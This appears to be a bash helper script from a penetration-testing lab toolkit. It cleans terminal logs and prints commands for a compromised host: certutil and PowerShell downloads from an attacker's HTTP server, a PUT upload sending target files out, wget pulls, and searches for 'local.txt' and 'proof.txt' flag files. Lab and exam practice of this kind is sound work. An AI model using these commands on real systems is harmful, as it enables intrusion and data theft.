#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")

remove_color_to_log() {
    cat | sed -u -E 's/\x1b\[[0-9;]*[mK]//g' | sed -u -E 's/\x1b\]0;.*\x07//g' | sed -u -E 's/\x1b\[0m//g' | sed -u -E 's/\x1b\[\?[0-9]+[hl]//g' | sed -u -E 's/\x1b\[C\x1b\[C\x1b\[C.*//g' | sed -u -E ':a;s/[^\x08]\x08//g;ta' | sed -u 's/\x07//g' #| sed -u 's/\x1b\[[0-9]*
}

escape_sed() {
    local input="$1"
    # Escape special characters for sed
    echo "$input" | sed -E 's/([\/&])/\\\1/g'
}

generate_windows_download() {
    if [[ ! -z "$current_shell_type" ]]; then
        if [[ "$current_shell_type" == "powershell" ]]; then
            generate_iwr "$1" "$2"
        else
            generate_certutil "$1" "$2"
        fi
    else
        generate_iwr "$1" "$2"
    fi
}

generate_certutil() {
    local file=$1
    local outfile=$2
    if [[ -z $outfile ]]; then
        outfile=$file
    fi
    if [ -z "$http_ip" ] || [ -z "$http_port" ]; then
        echo "HTTP IP address and port must be set before running certutil."
        return 1
    fi
    echo "certutil -urlcache -f http://$http_ip:$http_port/$file $outfile;"
}

generate_iwr() { 
    local file=$1
    local outfile=$2
    if [[ -z $outfile ]]; then
        outfile=$file
    fi
    if [ -z "$http_ip" ] || [ -z "$http_port" ]; then
        echo "HTTP IP address and port must be set before running certutil."
        return 1
    fi
    echo "iwr -uri http://$http_ip:$http_port/$file -OutFile $outfile ;"
}

upload_file() {
    local file=$1
    local infile=$2
    if [[ -z $infile ]]; then
        infile=$file
    fi
    if [ -z "$file" ]; then
        echo "File must be specified for upload."
        return 1
    fi
    echo "iwr -Uri http://$http_ip:$http_port/$file -InFile $infile -Method Put ;"
}

generate_download_linux() {
    generate_linux_download "$1" "$2"
}

generate_linux_download() {
    local file="$1"
    if [ -z "$file" ]; then
        echo "File name is required."
        return 1
    fi
    if [ ! -f "$file" ]; then
        echo "File $file does not exist."
        return 1
    fi
    file=$(echo "$file" | sed -E 's/ /%20/g')
    local output_option=""
    if [ ! -z "$2" ]; then
        output_option="-O \"$2\""
    else
        output_option="-O \"$file\""
    fi
    if [ -z "$http_ip" ] || [ -z "$http_port" ]; then
        echo "HTTP IP or port is not set."
        return 1
    fi
    echo "wget http://$http_ip:$http_port/$file $output_option"
}

remove_return() {
    local string=$1
    echo "$string" | tr -d '\r\n'
}

find_flag_windows() {
    echo 'hostname;'
    echo 'Get-ChildItem -Path C:\ -Recurse -Include local.txt,proof.txt -ErrorAction SilentlyContinue| Get-Content;'
}

find_flag_linux(){
    echo 'hostname;'
    echo 'find / \( -name local.txt -o -name proof.txt \) -type f -exec cat {} \;'
}

find_flag_windows_cmd() {
    echo 'hostname;'
    echo 'for /f %i in ('\''dir /s /b c:\*local.txt c:\*proof.txt 2^>nul'\'') do @echo === %i === && type "%i"'
}